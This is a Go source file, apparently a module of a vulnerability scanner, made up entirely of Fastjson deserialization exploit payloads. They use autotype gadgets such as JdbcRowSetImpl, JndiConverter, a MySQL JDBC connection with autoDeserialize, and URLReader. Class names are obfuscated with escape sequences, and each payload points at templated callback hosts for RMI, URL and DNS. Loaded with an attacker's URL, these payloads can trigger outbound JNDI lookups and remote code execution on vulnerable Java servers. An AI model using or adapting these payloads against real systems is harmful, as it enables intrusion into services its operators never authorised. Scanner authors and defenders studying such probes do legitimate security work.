/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package fastjson

func GetUrlPayload() (payloads []string) {
	payloads = append(payloads, `{
  "zqlhsg":{{
      "\x40\u0074\x79p\x65": "com.alibaba.fastjson.JSONObject",
      "oewago":
      {
        "\x40\u0074\x79p\x65":"java.lang.AutoCloseable",
        "\x40\u0074\x79p\x65": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
          "\x40\u0074\x79p\x65": "org.apache.commons.io.input.ReaderInputStream",
          "reader": {
            "\x40\u0074\x79p\x65": "jdk.nashorn.api.scripting.URLReader",
            "url": "{{reverse-url}}"
          },
          "charset": "UTF-8",
          "charsetName": "UTF-8",
          "bufferSize": 1024
        },
        "boms": [{
          "\x40\u0074\x79p\x65": "org.apache.commons.io.ByteOrderMark",
          "charsetName": "UTF-8",
          "bytes": [0]
        }]
      }
  }:{}}
}`)

	payloads = append(payloads, `{
  "eze7p9":{{
      "\x40typ\u0065": "com.alibaba.fastjson.JSONObject",
      "r36nnr":
      {
        "\x40typ\u0065":"java.lang.AutoCloseable",
        "\x40typ\u0065": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
          "\x40typ\u0065": "org.apache.commons.io.input.ReaderInputStream",
          "reader": {
            "\x40typ\u0065": "jdk.nashorn.api.scripting.URLReader",
            "url": "{{reverse-url}}"
          },
          "charset": "UTF-8",
          "charsetName": "UTF-8",
          "bufferSize": 1024
        },
        "boms": [{
          "\x40typ\u0065": "org.apache.commons.io.ByteOrderMark",
          "charsetName": "UTF-8",
          "bytes": [0]
        }]
      }
  }:{}}
}`)
	payloads = append(payloads, `[{
  "pski07":{{
      "\x40typ\u0065": "com.alibaba.fastjson.JSONObject",
      "treq8v":
      {
        "\x40typ\u0065":"java.lang.AutoCloseable",
        "\x40typ\u0065": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
          "\x40typ\u0065": "org.apache.commons.io.input.ReaderInputStream",
          "reader": {
            "\x40typ\u0065": "jdk.nashorn.api.scripting.URLReader",
            "url": "{{reverse-url}}"
          },
          "charset": "UTF-8",
          "charsetName": "UTF-8",
          "bufferSize": 1024
        },
        "boms": [{
          "\x40typ\u0065": "org.apache.commons.io.ByteOrderMark",
          "charsetName": "UTF-8",
          "bytes": [0]
        }]
      }
  }:{}}
}
]`)
	return
}

func GetDomainPayload() (payloads []string) {
	payloads = append(payloads, `{
  "xp7px6":{{
      "@\u0074yp\u0065": "com.alibaba.fastjson.JSONObject",
      "a87qwu":
      {
        "@\u0074yp\u0065":"java.lang.AutoCloseable",
        "@\u0074yp\u0065":"com.mysql.jdbc.JDBC4Connection",
        "hostToConnectTo":"{{reverse-domain}}",
        "portToConnectTo":3306,
        "info":{
          "user":"root",
          "password":"123456",
          "useSSL":"false",
          "statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
          "autoDeserialize":"true",
          "NUM_HOSTS":"1"
        },
        "databaseToConnectTo":"mysql",
        "url":""
      }
  }:{}}
}`)

	payloads = append(payloads, `{
  "il9c69":{{
      "\x40t\u0079pe": "com.alibaba.fastjson.JSONObject",
      "lrntyl":
      {
        "\x40t\u0079pe":"java.lang.AutoCloseable",
        "\x40t\u0079pe":"com.mysql.jdbc.JDBC4Connection",
        "hostToConnectTo":"{{reverse-domain}}",
        "portToConnectTo":3306,
        "info":{
          "user":"root",
          "password":"123456",
          "useSSL":"false",
          "statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
          "autoDeserialize":"true",
          "NUM_HOSTS":"1"
        },
        "databaseToConnectTo":"mysql",
        "url":""
      }
  }:{}}
}`)

	payloads = append(payloads, `[{
  "gp9vto":{{
      "\x40t\u0079pe": "com.alibaba.fastjson.JSONObject",
      "fcfgag":
      {
        "\x40t\u0079pe":"java.lang.AutoCloseable",
        "\x40t\u0079pe":"com.mysql.jdbc.JDBC4Connection",
        "hostToConnectTo":"{{reverse-domain}}",
        "portToConnectTo":3306,
        "info":{
          "user":"root",
          "password":"123456",
          "useSSL":"false",
          "statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
          "autoDeserialize":"true",
          "NUM_HOSTS":"1"
        },
        "databaseToConnectTo":"mysql",
        "url":""
      }
  }:{}}
}
]`)

	return
}

func GetRmiPayload() (payloads []string) {
	payloads = append(payloads, `{
  "aii87d": {
    "@type": "java.lang.Class",
    "val": "\x63\u006Fm\x2E\x73u\u006E.\x72\u006Fw\x73e\u0074.\u004AdbcRow\u0053et\u0049\x6Dpl"
  },
  "1qnb89": {
    "@type": "\x63\u006Fm\x2E\x73u\u006E.\x72\u006Fw\x73e\u0074.\u004AdbcRow\u0053et\u0049\x6Dpl",
    "dataSourceName": "{{reverse-rmi-url}}",
    "autoCommit": true
  }
}`)

	payloads = append(payloads, `{
  "r31nby": {
    "@t\x79pe": "L\x63om\x2E\u0073\u0075n.rows\x65\u0074\u002E\x4Ad\u0062cR\x6F\u0077Se\u0074\u0049\u006Dpl;",
    "dataSourceName": "{{reverse-rmi-url}}",
    "autoCommit": true
  }
}`)
	payloads = append(payloads, `{
  "gd9br5": {
    "\u0040t\u0079\u0070\x65": "o\x72g\u002Ea\x70\u0061\x63\x68e.xbe\u0061\x6E.\u0070\x72ope\x72t\x79\u0065\u0064\x69\x74\x6Fr\x2EJn\u0064\x69\u0043\x6Fn\x76\x65\u0072ter",
    "AsText": "{{reverse-rmi-url}}"
  }
}`)
	payloads = append(payloads, `{
        "ns1p60":{
                "@ty\u0070\u0065":"\u0063\u006F\u006D\x2E\u0073u\u006E.r\x6F\u0077\x73e\x74\u002E\u004A\x64b\u0063R\u006F\x77\u0053\u0065\u0074\x49mp\u006C",
                "dataSourceName":"{{reverse-rmi-url}}",
                "autoCommit":true
        }
}`)

	payloads = append(payloads, `{
        "eu1ck1":[
                {"\u0040t\u0079\u0070\u0065":"java.lang.Class","val":"\u0063\u006F\u006D.\u0073u\u006E.ro\u0077\u0073\u0065t\u002EJd\x62c\u0052\x6F\x77S\u0065\x74\x49mpl"},
                {"\u0040t\u0079\u0070\u0065":"\u0063\u006F\u006D.\u0073u\u006E.ro\u0077\u0073\u0065t\u002EJd\x62c\u0052\x6F\x77S\u0065\x74\x49mpl","dataSourceName":"{{reverse-rmi-url}}","autoCommit":true}
        ]
}`)
	payloads = append(payloads, `{
  "pz92i8":{"@\u0074ype":"java.lang.Class","val":"co\x6D\u002Esun.\x72o\x77set\x2EJ\x64\x62\u0063\u0052o\x77\u0053\x65\u0074Impl"},
  "ifpfvo":{{
      "@\u0074ype": "com.alibaba.fastjson.JSONObject",
      "lclmeq":
      {"@\u0074ype":"co\x6D\u002Esun.\x72o\x77set\x2EJ\x64\x62\u0063\u0052o\x77\u0053\x65\u0074Impl","dataSourceName":"{{reverse-rmi-url}}","autoCommit":true}
  }:{}}
}`)

	payloads = append(payloads, `{
  "faxqfa":{{
      "\u0040\x74\u0079p\u0065": "com.alibaba.fastjson.JSONObject",
      "w34uu8":
      {
        "\u0040\x74\u0079p\u0065":"java.lang.AutoCloseable",
        "\u0040\x74\u0079p\u0065":"com.mysql.jdbc.JDBC4Connection",
        "hostToConnectTo":"{{reverse-rmi-url}}",
        "portToConnectTo":3306,
        "info":{
          "user":"root",
          "password":"123456",
          "useSSL":"false",
          "statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
          "autoDeserialize":"true",
          "NUM_HOSTS":"1"
        },
        "databaseToConnectTo":"mysql",
        "url":""
      }
  }:{}}
}`)

	payloads = append(payloads, `{
  "07hezs":{{
      "@\u0074\x79p\u0065": "com.alibaba.fastjson.JSONObject",
      "3e3ysm":
      {
        "@\u0074\x79p\u0065":"java.lang.AutoCloseable",
        "@\u0074\x79p\u0065": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
          "@\u0074\x79p\u0065": "org.apache.commons.io.input.ReaderInputStream",
          "reader": {
            "@\u0074\x79p\u0065": "jdk.nashorn.api.scripting.URLReader",
            "url": "{{reverse-rmi-url}}"
          },
          "charset": "UTF-8",
          "charsetName": "UTF-8",
          "bufferSize": 1024
        },
        "boms": [{
          "@\u0074\x79p\u0065": "org.apache.commons.io.ByteOrderMark",
          "charsetName": "UTF-8",
          "bytes": [0]
        }]
      }
  }:{}}
}`)

	payloads = append(payloads, `[{
  "v0n66s":{{
      "@\u0074\x79p\u0065": "com.alibaba.fastjson.JSONObject",
      "2unhvm":
      {
        "@\u0074\x79p\u0065":"java.lang.AutoCloseable",
        "@\u0074\x79p\u0065": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
          "@\u0074\x79p\u0065": "org.apache.commons.io.input.ReaderInputStream",
          "reader": {
            "@\u0074\x79p\u0065": "jdk.nashorn.api.scripting.URLReader",
            "url": "{{reverse-rmi-url}}"
          },
          "charset": "UTF-8",
          "charsetName": "UTF-8",
          "bufferSize": 1024
        },
        "boms": [{
          "@\u0074\x79p\u0065": "org.apache.commons.io.ByteOrderMark",
          "charsetName": "UTF-8",
          "bytes": [0]
        }]
      }
  }:{}}
}
]`)
	payloads = append(payloads, `[{
  "2gex3l":{{
      "\u0040\x74\u0079p\u0065": "com.alibaba.fastjson.JSONObject",
      "p6nt1h":
      {
        "\u0040\x74\u0079p\u0065":"java.lang.AutoCloseable",
        "\u0040\x74\u0079p\u0065":"com.mysql.jdbc.JDBC4Connection",
        "hostToConnectTo":"{{reverse-rmi-url}}",
        "portToConnectTo":3306,
        "info":{
          "user":"root",
          "password":"123456",
          "useSSL":"false",
          "statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
          "autoDeserialize":"true",
          "NUM_HOSTS":"1"
        },
        "databaseToConnectTo":"mysql",
        "url":""
      }
  }:{}}
}
]`)
	payloads = append(payloads, `[{
  "gg96i0": {
    "@t\u0079\x70e": "java.lang.Class",
    "val": "\x63\u006F\u006D\u002Esun\x2E\x72ow\x73\x65\x74\u002E\u004Ad\x62\x63Ro\x77\u0053e\u0074\u0049mpl"
  },
  "ktatz6": {
    "@t\u0079\x70e": "\x63\u006F\u006D\u002Esun\x2E\x72ow\x73\x65\x74\u002E\u004Ad\x62\x63Ro\x77\u0053e\u0074\u0049mpl",
    "dataSourceName": "{{reverse-rmi-url}}",
    "autoCommit": true
  }
}]`)

	payloads = append(payloads, `[{
  "40nrfw": {
    "\x40ty\u0070\x65": "\x6F\x72\u0067.a\x70ach\x65\x2E\u0078\x62\x65\u0061n\u002Ep\u0072o\x70e\u0072\u0074y\u0065\x64\x69to\x72.J\x6Edi\u0043onver\u0074e\u0072",
    "AsText": "{{reverse-rmi-url}}"
  }
}
]`)
	payloads = append(payloads, `[{
  "k56nul": {
    "\u0040typ\u0065": "L\u0063\u006F\u006D\x2E\u0073\x75\x6E.ro\u0077\u0073et.\u004A\u0064\u0062c\u0052\u006FwSe\u0074Im\u0070\u006C;",
    "dataSourceName": "{{reverse-rmi-url}}",
    "autoCommit": true
  }
}]`)

	payloads = append(payloads, `[{
        "pz6sbw":{
                "@ty\u0070\x65":"c\u006Fm.\u0073u\x6E\u002E\u0072owset.J\x64\u0062cR\x6FwSet\u0049\u006D\x70l",
                "dataSourceName":"{{reverse-rmi-url}}",
                "autoCommit":true
        }
}
]`)
	payloads = append(payloads, `[{
        "p8g007":[
                {"@ty\u0070\x65":"java.lang.Class","val":"c\u006Fm\u002E\u0073un.rowset.Jd\u0062\x63R\x6Fw\x53e\u0074\u0049\u006Dpl"},
                {"@ty\u0070\x65":"c\u006Fm\u002E\u0073un.rowset.Jd\u0062\x63R\x6Fw\x53e\u0074\u0049\u006Dpl","dataSourceName":"{{reverse-rmi-url}}","autoCommit":true}
        ]
}
]`)
	payloads = append(payloads, `[{
  "oohdgh":{"\u0040t\x79pe":"java.lang.Class","val":"c\u006Fm.su\u006E.\u0072\u006F\x77se\x74.JdbcRow\x53\x65t\u0049mpl"},
  "09rfpi":{{
      "\u0040t\x79pe": "com.alibaba.fastjson.JSONObject",
      "7tvf62":
      {"\u0040t\x79pe":"c\u006Fm.su\u006E.\u0072\u006F\x77se\x74.JdbcRow\x53\x65t\u0049mpl","dataSourceName":"{{reverse-rmi-url}}","autoCommit":true}
  }:{}}
}
]`)

	payloads = append(payloads, `{
  "3stb3w":{"@\u0074y\x70\x65":"java.lang.Class","val":"c\x6F\u006D.sun\u002E\u0072ow\x73et\u002EJ\u0064\x62c\x52owSe\x74\u0049mpl"},
  "9ftw70":{{
      "@\u0074y\x70\x65": "com.alibaba.fastjson.JSONObject",
      "r69epg":
      {"@\u0074y\x70\x65":"c\x6F\u006D.sun\u002E\u0072ow\x73et\u002EJ\u0064\x62c\x52owSe\x74\u0049mpl","dataSourceName":"{{reverse-rmi-url}}","autoCommit":true}
  }:{}}
}`)
	payloads = append(payloads, `{
        "4bxfz9":[
                {"\x40typ\u0065":"java.lang.Class","val":"com.s\x75n\x2Ero\u0077\u0073\x65t\x2EJ\x64b\u0063Row\x53\x65t\u0049\u006Dp\u006C"},
                {"\x40typ\u0065":"com.s\x75n\x2Ero\u0077\u0073\x65t\x2EJ\x64b\u0063Row\x53\x65t\u0049\u006Dp\u006C","dataSourceName":"{{reverse-rmi-url}}","autoCommit":true}
        ]
}`)
	payloads = append(payloads, `[{
  "0ec7yo": {
    "@t\u0079\u0070\u0065": "\u006F\u0072g\u002Ea\u0070\x61\u0063\u0068e.xbe\u0061\u006E\u002Ep\u0072o\u0070ert\u0079e\u0064\u0069\u0074o\u0072\x2EJn\x64iCon\x76e\x72ter",
    "AsText": "{{reverse-rmi-url}}"
  }
}
]`)
	payloads = append(payloads, `[{
  "0rph5t": {
    "\u0040ty\u0070\u0065": "Lc\u006F\x6D.s\x75n\x2E\u0072ow\u0073\x65t\u002E\u004A\u0064bc\x52\u006FwSe\u0074\x49m\u0070\x6C;",
    "dataSourceName": "{{reverse-rmi-url}}",
    "autoCommit": true
  }
}]`)
	payloads = append(payloads, `[{
  "64p9gu": {
    "@type": "java.lang.Class",
    "val": "c\u006F\x6D.su\x6E.\x72\u006F\x77s\x65t\u002EJ\u0064bc\u0052owS\u0065t\u0049\x6Dp\x6C"
  },
  "lywr78": {
    "@type": "c\u006F\x6D.su\x6E.\x72\u006F\x77s\x65t\u002EJ\u0064bc\u0052owS\u0065t\u0049\x6Dp\x6C",
    "dataSourceName": "{{reverse-rmi-url}}",
    "autoCommit": true
  }
}]`)
	payloads = append(payloads, `[{
        "g5mfxf":{
                "@\x74\u0079\x70\u0065":"c\u006Fm.\u0073un.\x72o\u0077\u0073e\u0074\u002EJ\u0064\u0062c\x52ow\x53\u0065t\u0049\x6D\x70l",
                "dataSourceName":"{{reverse-rmi-url}}",
                "autoCommit":true
        }
}
]`)
	return
}
